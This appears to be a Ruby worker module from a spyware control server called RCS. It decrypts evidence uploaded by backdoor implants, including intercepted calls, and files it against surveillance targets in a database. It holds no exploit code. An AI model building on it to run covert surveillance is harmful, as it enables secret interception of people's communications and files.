require_relative 'audio_processor'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/evidence_manager'

require 'rcs-db/db_layer'
require 'rcs-db/grid'

# specific evidence processors
Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS
module Worker

class InstanceProcessor
  include RCS::Tracer
  
  SLEEP_TIME = 10
  
  def initialize(id)
    @id = id
    @evidences = []
    @state = :stopped
    @seconds_sleeping = 0
    
    # get info about the backdoor instance from evidence db
    @info = RCS::EvidenceManager.instance.instance_info @id
    raise "Instance \'#{@id}\' cannot be found." if @info.nil?
    
    trace :info, "Created processor for backdoor #{@info['build']}:#{@info['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{@info['key']}"
    @key = Digest::MD5.digest @info['key']
    
    @call_processor = CallProcessor.new
  end
  
  def resume
    @state = :running
    RCS::EvidenceManager.instance.sync_status({:instance => @info['instance']}, RCS::EvidenceManager::SYNC_PROCESSING)
    @seconds_sleeping = 0
  end
  
  def take_some_rest
    sleep 1
    @seconds_sleeping += 1
    #trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
  end
  
  def put_to_sleep
    @state = :stopped
    RCS::EvidenceManager.instance.sync_status({:instance => @info['instance']}, RCS::EvidenceManager::SYNC_IDLE)
    trace :debug, "processor #{@id} is sleeping too much, let's stop!"
  end
  
  def stopped?
    @state == :stopped
  end
  
  def sleeping_too_much?
    @seconds_sleeping >= SLEEP_TIME
  end
  
  def queue(id)
    @evidences << id unless id.nil?
    #trace :info, "queueing evidence id #{id} for #{@id}"
    
    process = Proc.new do
      resume
      
      until sleeping_too_much?
        until @evidences.empty?
          resume
          evidence_id = @evidences.shift

          begin
            start_time = Time.now

            # get binary evidence
            data = RCS::EvidenceManager.instance.get_evidence(evidence_id, @id)
            raise "Empty evidence" if data.nil?
            
            # deserialize binary evidence
            evidences = RCS::Evidence.new(@key).deserialize(data)
            if evidences.nil?
              trace :debug, "error deserializing evidence #{evidence_id} for backdoor #{@id}, skipping ..."
              next
            end
            
            evidences.each do |evidence|
              
              # store evidence_id inside evidence, we need it inside processors
              evidence.info[:db_id] = evidence_id
              
              # delete empty evidences
              if evidence.empty?
                RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @id)
                trace :debug, "deleted empty evidence for backdoor #{@id}"
                next
              end
              
              # store backdoor instance in evidence (used when storing into db)
              evidence.info[:instance] = @id
              
              # find correct processing module and extend evidence
              mod = "#{evidence.info[:type].to_s.capitalize}Processing"
              evidence.extend eval mod if RCS.const_defined? mod.to_sym
              evidence.process if evidence.respond_to? :process

              info = nil
              while info.nil? do
                info = RCS::EvidenceManager.instance.instance_info(@id)
              end

              evidence.info[:backdoor] = info["bid"] unless info.nil?
              
              case evidence.info[:type]
                when :CALL
                  @call_processor.feed(evidence)
                else
                  # TODO: refactor as a standalone processor (ie. CommonProcessor)
                  done = false
                  until done
                    begin
                      # TODO: handle all the failure in saving the evidence in the db

                      backdoor = ::Item.where({_kind: 'backdoor', _id: evidence.info[:backdoor]}).first
                      target = ::Item.where({_kind: 'target', _id: backdoor[:_path].last}).first

                      ev = ::Evidence.dynamic_new target[:_id].to_s
                      ev.acquired = evidence.info[:acquired].to_i
                      ev.received = evidence.info[:received].to_i
                      ev.type = evidence.info[:type]
                      ev.relevance = 1
                      ev.blotter = false
                      ev.item = [ backdoor[:_id] ]

                      ev.data = evidence.info[:data]

                      # save the binary data
                      unless evidence.info[:grid_content].nil?
                        ev.data[:_grid_size] = evidence.info[:grid_content].bytesize
                        ev.data[:_grid] = GridFS.instance.put(evidence.info[:grid_content], {filename: backdoor[:_id].to_s}) unless evidence.info[:grid_content].nil?
                      end

                      ev.save

                      RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @id)
                      done = true
                    rescue Exception => e
                      trace :debug, "[#{@id}] UNRECOVERABLE ERROR [#{e.message}, #{e.class}]"
                      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
                    end
                  end
              end
              
              processing_time = Time.now - start_time
              trace :info, "processed #{evidence.info[:type].upcase} (#{data.size.to_s_bytes}) for #{@id} in #{processing_time} sec"
            end
          
          rescue EvidenceDeserializeError => e
            trace :warn, "[#{@id}] decoding failed for #{evidence_id}: " << e.to_s
            # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          rescue Exception => e
            trace :fatal, "FAILURE: " << e.to_s
            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          end
        end
        take_some_rest
      end
      
      put_to_sleep
    end
    
    if stopped?
      trace :debug, "deferring work for #{@id}"
      EM.defer process
    end
  end
  
  def to_s
    "instance #{@id}: #{@evidences}"
  end
end

end # ::Worker
end # ::RCS
